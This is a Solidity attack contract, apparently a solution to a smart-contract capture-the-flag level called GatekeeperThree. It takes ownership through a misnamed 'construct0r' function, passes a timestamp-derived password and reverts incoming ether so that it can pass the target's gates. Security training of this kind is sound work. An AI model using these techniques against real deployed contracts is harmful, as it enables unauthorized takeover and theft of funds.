// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IGatekeeperThree {
    function construct0r() external;
    function getAllowance(uint256 _password) external;
    function createTrick() external;
    function enter() external;
}

contract GT3Attack is Ownable {
    IGatekeeperThree public target;

    constructor(address _owner, address _target) Ownable(_owner) {
        target = IGatekeeperThree(_target);
    }

    function setTarget(address _target) public onlyOwner {
        target = IGatekeeperThree(_target);
    }

    function pwn() public onlyOwner(){

        target.construct0r();

        target.createTrick();
        target.getAllowance(block.timestamp);
        
        target.enter();

    }

    function gateOne() public onlyOwner{
        target.construct0r();
    }

    function gateTwo() public onlyOwner{
        target.createTrick();
        target.getAllowance(block.timestamp);
        
    }

    function Enter() public onlyOwner{
        target.enter();
    }

    receive() external payable { //gateThree
        revert();
    }

}